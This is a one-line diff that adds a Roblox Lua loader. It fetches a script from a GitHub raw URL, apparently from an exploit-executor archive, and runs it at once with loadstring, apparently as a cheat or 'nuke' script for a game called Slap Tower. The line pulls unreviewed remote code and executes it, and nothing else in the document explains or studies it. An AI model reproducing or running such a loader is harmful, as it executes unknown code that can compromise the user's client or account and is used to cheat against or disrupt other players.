@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ArceusXArchive/Nuke-Slap-Tower1/refs/heads/main/Q", true))()
